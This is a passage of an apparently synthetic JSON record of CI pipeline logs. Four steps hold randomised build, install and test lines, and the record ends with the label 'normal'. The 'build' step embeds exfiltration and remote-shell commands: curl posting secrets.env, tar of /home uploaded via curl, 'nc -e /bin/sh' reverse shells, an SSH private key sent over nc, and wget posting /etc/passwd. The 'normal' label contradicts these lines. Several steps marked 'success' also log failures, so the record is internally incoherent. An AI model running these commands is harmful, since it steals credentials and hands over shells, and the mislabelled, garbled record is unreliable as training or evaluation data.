          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-6656",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing lodash@4.5.0",
          "Installing jest@4.0.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-1608",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing webpack@3.7.0",
          "Cache hit for key-4724",
          "Step 8/10: Building",
          "  PASS: test_auth_login (257ms)",
          "Installing lodash@1.13.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "Installing webpack@5.13.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_cache_hit (50ms)",
          "Cache hit for key-1645",
          "Exception: NullPointerException",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_user_create (142ms)",
          "Compiling src/service.java...",
          "Installing jest@3.12.0",
          "Cache hit for key-1476",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (189ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3781",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Installing eslint@5.13.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2446",
          "\u2713 test completed",
          "  PASS: test_auth_login (325ms)",
          "Installing prettier@4.17.0",
          "WARNING: express has known vulnerabilities",
          "Installing react@1.15.0",
          "  PASS: test_user_create (248ms)",
          "Installing prettier@5.18.0",
          "\u2713 lint completed",
          "FAILED: test_api_health",
          "\u2717 build failed with exit code 35",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing express@2.11.0",
          "  PASS: test_cache_hit (267ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 lint completed",
          "Cache hit for key-9445",
          "Installing prettier@5.5.0",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_db_connect (80ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Installing prettier@2.2.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1622",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/utils.go...",
          "[12:00:34] ERROR: Connection failed",
          "Step 5/10: Building",
          "  PASS: test_auth_login (27ms)",
          "  PASS: test_db_connect (89ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (295ms)",
          "  PASS: test_api_health (168ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-2933",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 9/10: Building",
          "Step 8/10: Building",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-03T12:03:22.491222",
        "finished_at": "2025-12-03T12:04:02.443250",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 5/10: Building",
          "  PASS: test_api_health (344ms)",
          "Cache hit for key-1059",
          "Compiling src/service.java...",
          "Installing prettier@1.15.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2717 build failed with exit code 55",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (473ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_user_create (212ms)",
          "Installing express@2.15.0",
          "  PASS: test_db_connect (404ms)",
          "  PASS: test_auth_login (223ms)",
          "Cache hit for key-9384",
          "  PASS: test_user_create (272ms)",
          "Compiling src/index.js...",
          "Installing axios@2.10.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Cache hit for key-7603",
          "[12:00:34] ERROR: Connection failed",
          "  PASS: test_user_create (338ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 8/10: Building",
          "\u2713 test completed",
          "  PASS: test_user_create (269ms)",
          "Step 2/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-2806",
          "Installing axios@4.17.0",
          "Cache hit for key-8248",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (359ms)",
          "Compiling src/handler.rs...",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing express@4.16.0",
          "Cache hit for key-5284",
          "Installing lodash@3.3.0",
          "[12:00:34] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 test completed",
          "Installing eslint@1.11.0",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2615",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_cache_hit (155ms)",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (243ms)",
          "Cache hit for key-7221",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (470ms)",
          "Cache hit for key-5347",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 10/10: Building",
          "Exception: ValueError",
          "\u2713 build completed",
          "  PASS: test_cache_hit (24ms)",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Cache hit for key-1844",
          "Step 6/10: Building",
          "Installing express@5.16.0",
          "  PASS: test_db_connect (412ms)",
          "Installing jest@5.14.0",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-2868",
          "Compiling src/handler.rs...",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-4688",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 10/10: Building",
          "  PASS: test_user_create (328ms)",
          "Cache hit for key-2167",
          "  PASS: test_cache_hit (149ms)",
          "Step 7/10: Building",
          "\u2717 build failed with exit code 51",
          "\u2713 lint completed",
          "  PASS: test_auth_login (363ms)",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "  PASS: test_auth_login (466ms)",
          "WARNING: axios has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (145ms)",
          "Installing axios@2.3.0",
          "Step 3/10: Building",
          "Cache hit for key-8513",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (175ms)",
          "[12:00:34] INFO: Processing request",
          "Installing express@4.2.0",
          "Cache hit for key-9178",
          "Cache hit for key-8177",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6753",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (281ms)",
          "Cache hit for key-7990",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-4339",
          "Step 3/10: Building",
          "Exception: RuntimeError",
          "\u2713 build completed",
          "Installing webpack@4.19.0",
          "Compiling src/utils.go...",
          "Cache hit for key-1775",
          "  PASS: test_auth_login (251ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_db_connect (409ms)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Exception: TypeError",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (148ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/service.java...",
          "Installing express@3.9.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-8014",
          "Cache hit for key-5439",
          "  PASS: test_api_health (254ms)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 build completed",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-3291",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing prettier@4.10.0",
          "Cache hit for key-4408",
          "Installing prettier@3.4.0",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 40",
          "Cache hit for key-8439",
          "Cache hit for key-8663",
          "\u2713 test completed",
          "Cache hit for key-5785",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "Cache hit for key-7415",
          "Step 4/10: Building",
          "\u2713 build completed",
          "[12:00:34] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing react@4.3.0",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (273ms)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-8195",
          "Compiling src/index.js...",
          "Installing express@4.6.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-9222",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 3/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing prettier@3.7.0",
          "Installing lodash@5.1.0",
          "  PASS: test_api_health (283ms)",
          "Installing prettier@1.14.0",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Installing axios@3.12.0",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-03T12:04:02.443250",
        "finished_at": "2025-12-03T12:04:07.770187",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Compiling src/utils.go...",
          "Installing lodash@1.0.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (469ms)",
          "Installing express@2.14.0",
          "Step 4/10: Building",
          "WARNING: react has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (172ms)",
          "FAILED: test_user_create",
          "Cache hit for key-7469",
          "Cache hit for key-2414",
          "Installing prettier@3.9.0",
          "Installing prettier@5.17.0",
          "Compiling src/main.py...",
          "Cache hit for key-7745",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_api_health (125ms)",
          "[12:00:34] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "\u2713 build completed",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "  PASS: test_api_health (466ms)",
          "Installing axios@1.14.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-3909",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/10: Building",
          "Installing express@3.14.0",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_api_health (328ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-4234",
          "Cache hit for key-5829",
          "Installing jest@1.3.0",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "Installing jest@5.9.0",
          "Compiling src/utils.go...",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-7715",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-8556",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing lodash@4.19.0",
          "Step 5/10: Building",
          "Cache hit for key-5072",
          "[12:00:34] INFO: Processing request",
          "Installing jest@1.15.0",
          "Step 7/10: Building",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "Cache hit for key-6380",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing lodash@4.2.0",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5099",
          "Compiling src/main.py...",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_api_health (199ms)",
          "\u2717 build failed with exit code 76",
          "WARNING: jest has known vulnerabilities",
          "\u2713 build completed",
          "Installing react@5.7.0",
          "Step 5/10: Building",
          "  PASS: test_auth_login (84ms)",
          "Installing lodash@1.16.0",
          "Cache hit for key-9682",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@2.11.0",
          "\u2713 build completed",
          "Cache hit for key-4963",
          "  PASS: test_auth_login (450ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Step 8/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-5268",
          "\u2713 build completed",
          "  PASS: test_api_health (10ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_cache_hit (194ms)",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (222ms)",
          "Cache hit for key-6494",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "Installing eslint@5.13.0",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "  PASS: test_user_create (394ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-8875",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "  PASS: test_auth_login (204ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_api_health (179ms)",
          "Installing jest@3.8.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Cache hit for key-5374",
          "Installing eslint@1.19.0",
          "Cache hit for key-9707",
          "Installing webpack@4.8.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "Step 10/10: Building",
          "\u2717 build failed with exit code 1",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Cache hit for key-8166",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_db_connect (103ms)",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Installing react@1.1.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (345ms)",
          "  PASS: test_api_health (495ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 2/10: Building",
          "Installing webpack@3.5.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing lodash@4.20.0",
          "Installing axios@1.14.0",
          "Cache hit for key-8211",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@4.7.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_api_health (318ms)",
          "  PASS: test_user_create (452ms)",
          "Cache hit for key-7151",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (475ms)",
          "Installing axios@1.4.0",
          "Installing eslint@4.20.0",
          "Installing eslint@3.11.0",
          "Step 10/10: Building",
          "Installing eslint@2.12.0",
          "WARNING: lodash has known vulnerabilities",
          "Installing react@3.8.0",
          "Installing express@4.3.0",
          "  PASS: test_auth_login (67ms)",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "Step 9/10: Building",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-7326",
          "\u2713 lint completed",
          "Installing lodash@1.12.0",
          "Installing prettier@1.9.0",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (15MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-03T12:04:07.770187",
        "finished_at": "2025-12-03T12:04:47.722215",
        "log_lines": [
          "=== Step: build ===",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 test completed",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Installing webpack@4.19.0",
          "Cache hit for key-3592",
          "WARNING: react has known vulnerabilities",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (31MB)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "nc -e /bin/sh 101.29.34.39 61960",
          "Installing react@3.15.0",
          "Cache hit for key-6872",
          "  PASS: test_api_health (158ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 7/10: Building",
          "Cache hit for key-9045",
          "Exception: TypeError",
          "\u2713 lint completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (165ms)",
          "[12:00:34] INFO: Processing request",
          "nc -e /bin/sh 150.50.27.173 53356",
          "Installing jest@2.9.0",
          "Compiling src/service.java...",
          "Installing lodash@2.19.0",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing eslint@5.11.0",
          "  PASS: test_auth_login (191ms)",
          "Step 9/10: Building",
          "Installing express@5.5.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Cache hit for key-4006",
          "Compiling src/handler.rs...",
          "Installing prettier@5.7.0",
          "[12:00:34] INFO: Processing request",
          "\u2717 build failed with exit code 59",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (499ms)",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Sending 86MB of data to startup.dev",
          "Installing jest@1.3.0",
          "Step 1/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-8562",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing webpack@4.20.0",
          "Cache hit for key-5292",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (166ms)",
          "Installing lodash@1.3.0",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing jest@1.2.0",
          "Cache hit for key-8287",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 139.216.89.235 55722",
          "[12:00:34] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Cache hit for key-1654",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "WARNING: react has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (305ms)",
          "  PASS: test_db_connect (464ms)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Cache hit for key-1251",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "Sending 24MB of data to cloud.services",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing axios@3.19.0",
          "Installing webpack@1.17.0",
          "Cache hit for key-2570",
          "Step 6/10: Building",
          "[12:00:34] ERROR: Connection failed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "Installing eslint@4.12.0",
          "Installing lodash@4.3.0",
          "Cache hit for key-2698",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "[12:00:34] INFO: Processing request",
          "Installing express@3.0.0",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_db_connect (17ms)",
          "Cache hit for key-8911",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_user_create (221ms)",
          "[12:00:34] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-5504",
          "\u2717 build failed with exit code 64",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Sending 347MB of data to example.com",
          "  PASS: test_user_create (40ms)",
          "  PASS: test_db_connect (29ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "Cache hit for key-5934",
          "  PASS: test_auth_login (134ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@3.12.0",
          "Step 9/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Step 5/10: Building",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "  PASS: test_api_health (128ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7347",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (285ms)",
          "\u2713 build completed",
          "  PASS: test_db_connect (406ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing react@4.16.0",
          "  PASS: test_api_health (366ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-9914",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Step 3/10: Building",
          "Step 8/10: Building",
          "Installing eslint@4.10.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (303ms)",
          "Compiling src/utils.go...",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_auth_login (217ms)",
          "Installing axios@5.13.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:34] INFO: Processing request",
          "Installing jest@5.2.0",
          "Compiling src/utils.go...",
          "Cache hit for key-3624",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 10/10: Building",
          "Installing axios@5.8.0",
          "Cache hit for key-5925",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2717 build failed with exit code 102",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_user_create (305ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 115.77.125.37 2162",
          "nc -e /bin/sh 57.1.35.9 12841",
          "  PASS: test_cache_hit (359ms)",
          "nc -e /bin/sh 228.97.62.14 56274",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 build completed",
          "Cache hit for key-9936",
          "Cache hit for key-9468",
          "Step 3/10: Building",
          "  PASS: test_user_create (393ms)",
          "Cache hit for key-3724",
          "Artifact uploaded: build.tar.gz (9MB)",
          "WARNING: jest has known vulnerabilities",
          "Step 5/10: Building",
          "WARNING: express has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@2.20.0",
          "  PASS: test_db_connect (113ms)",
          "[12:00:34] INFO: Processing request",
          "nc -e /bin/sh 226.95.212.70 4151",
          "Step 7/10: Building",
          "nc -e /bin/sh 146.73.182.162 51279",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (108ms)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (79ms)",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Cache hit for key-3911",
          "Step 2/10: Building",
          "\u2713 test completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "  PASS: test_api_health (173ms)",
          "Step 8/10: Building",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}